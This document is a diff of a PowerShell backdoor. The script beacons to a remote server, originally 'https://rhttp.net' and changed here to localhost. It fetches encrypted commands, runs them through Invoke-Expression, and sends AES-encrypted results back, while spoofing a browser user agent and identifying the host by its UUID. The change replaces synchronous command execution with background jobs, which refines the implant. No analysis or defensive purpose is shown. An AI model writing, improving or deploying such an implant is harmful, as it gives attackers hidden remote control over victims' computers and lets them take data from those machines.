@@ -1,4 +1,4 @@
-$SERVER_URL = "https://rhttp.net"
+$SERVER_URL = "http://localhost"
 $UAG='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
 [Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
@@ -52,19 +52,11 @@ function DcryptString {
     $dec = $aes.CreateDecryptor()
     $RESULT = $dec.TransformFinalBlock($data, 0, $data.Length)
     $RESULTStr = $utf8.GetString($RESULT)
-    Write-Output $RESULTStr
+    return $RESULTStr
     $dec.Dispose()
 }
 
-function RunCommand {
-    Param ([string]$inputStr)
-    if ($inputStr -like "Terminate") {
-        exit
-    }
 
-    return Invoke-Expression $inputStr | Out-String
-
-}
 # end internal function
 
 while ($true) {
@@ -82,7 +74,8 @@ while ($true) {
     Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM -UserAgent $UAG
    
     while ($true) {
-        $TIMER = Get-Random -SetSeed 100 -Maximum 1000
+
+        $TIMER = Get-Random -SetSeed 300 -Maximum 700
         sleep -Milliseconds $TIMER
         $UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
         $SYSTEM = @{
@@ -101,34 +94,52 @@ while ($true) {
         if ($REQ -ne "wait") {
 
             $JSON = $REQ | ConvertFrom-Json
-            $MODE = $JSON.json
-        
-            $CMD = $JSON.cmd
-            $RUN = RunCommand $CMD
-            if ($RUN -eq "") {
-                $RUN = "OK"
-            }
-            
-         
-            $CMD_UID = $JSON.cmd_uid
-            $SYSTEM = @{
-                uuid    = "$UID"
-                result  = "$RUN"
-                cmd_uid = "$CMD_UID"
-            }
-            $JSON = $SYSTEM | ConvertTo-JSON -Depth 100
-         
-            $CRYPT = EncryptString  $JSON
+     
 
-            $PARAM = @{
-                DATA = $CRYPT
-            
-            }
-         
-            Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM -UserAgent $UAG
+            foreach ($file in $JSON) {
+            $MODE = $file.json
+            $CMD_UID = $file.cmd_uid
+            $CMD = $file.cmd
+ 
+       if(Get-Job -name $CMD_UID -ErrorAction SilentlyContinue ){
+
+        if((Get-Job -name $CMD_UID -ErrorAction SilentlyContinue| select -ExpandProperty State) -eq "Completed" -or (Get-Job -name $CMD_UID -ErrorAction SilentlyContinue| select -ExpandProperty State) -eq "Failed"){
+            $RUN=Receive-Job -Name $CMD_UID   -ErrorAction SilentlyContinue
+                    if ($RUN -eq "" -or $RUN -eq $null) {
+                        $RUN = "No Result"
+                    }
+                    
+                
+                    $SYSTEM = @{
+                        uuid    = "$UID"
+                        result  = "$RUN"
+                        cmd_uid = "$CMD_UID"
+                    }
+                    $JSON = $SYSTEM | ConvertTo-JSON -Depth 100
+                
+                    $CRYPT = EncryptString  $JSON
+
+                    $PARAM = @{
+                        DATA = $CRYPT
+                    
+                    }
+                
+                    Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM -UserAgent $UAG
+        }
+           
+                    
+          }else{
+                       $SB = [scriptblock]::Create("iex '$CMD | Out-String'")
+                       $JOB=Start-Job -ScriptBlock $SB -Name $CMD_UID -ErrorAction SilentlyContinue
+          }
+                
+}
+     
+          
             
             
         }
+         
     }
     
     
